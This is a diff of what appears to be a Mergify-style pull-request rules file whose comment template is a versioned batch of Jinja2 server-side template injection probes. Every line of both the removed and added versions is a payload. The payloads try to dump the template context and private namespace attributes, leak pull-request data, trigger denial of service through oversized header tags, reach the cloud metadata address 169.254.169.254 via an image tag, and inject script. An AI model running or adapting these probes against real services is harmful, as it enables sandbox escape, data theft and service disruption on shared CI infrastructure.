@@ -1,27 +1,18 @@
 pull_request_rules:
-  - name: ssti-oracle-probes
+  - name: ssti-oracle-v12-8321
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T ORACLE PROBES ===
-          ---
-          [P1] ctx-pprint: {{ self._TemplateReference__context | pprint }}
-          ---
-          [P2] ctx-format: {{ '%r' | format(self._TemplateReference__context) }}
-          ---
-          [P3] ns-globals: {{ namespace(c=cycler, l=lipsum, j=joiner, n=namespace, r=range, s=self)._Namespace__attrs }}
-          ---
-          [P4] ns-with-ctx: {{ namespace(x=self._TemplateReference__context)._Namespace__attrs }}
-          ---
-          [P5] lipsum-addr: {{ '%s' | format(lipsum) }}
-          ---
-          [P6] cycler-addr: {{ '%s' | format(cycler) }}
-          ---
-          [P7] joiner-addr: {{ '%s' | format(joiner()) }}
-          ---
-          [P8] self-pprint: {{ self | pprint }}
-          ---
-          [P9] markdownify-dos: {{ '<h99999999>X' | markdownify }}
-          ---
-          [P10] ns-with-author: {{ namespace(a=author, b=body, f=files, h=head, ba=base)._Namespace__attrs }}
+          === G4o7T ORACLE v12 ===
+          [O1] lipsum-addr: {{ '%s' | format(lipsum) | default('') }}
+          [O2] cycler-addr: {{ '%s' | format(cycler) | default('') }}
+          [O3] namespace-addr: {{ '%s' | format(namespace) | default('') }}
+          [O4] joiner-inst: {{ '%s' | format(joiner()) | default('') }}
+          [O5] cycler-inst: {{ '%s' | format(cycler('a','b')) | default('') }}
+          [O6] ns-attrs: {{ namespace(c=cycler, l=lipsum, j=joiner, n=namespace, r=range)._Namespace__attrs | default('') }}
+          [O7] ns-pr-data: {{ namespace(a=author, b=body, f=files, h=head, t=title, n=number)._Namespace__attrs | default('') }}
+          [O8] md-dos-h99: {{ '<h99999>X</h99999>' | markdownify | default('') }}
+          [O9] md-dos-img: {{ '<img src=http://169.254.169.254/latest/meta-data/>' | markdownify | default('') }}
+          [O10] md-script: {{ '<script>alert(1)</script>' | markdownify | default('') }}
+          [O11] tr-context: {{ self._TemplateReference__context | pprint | default('') }}
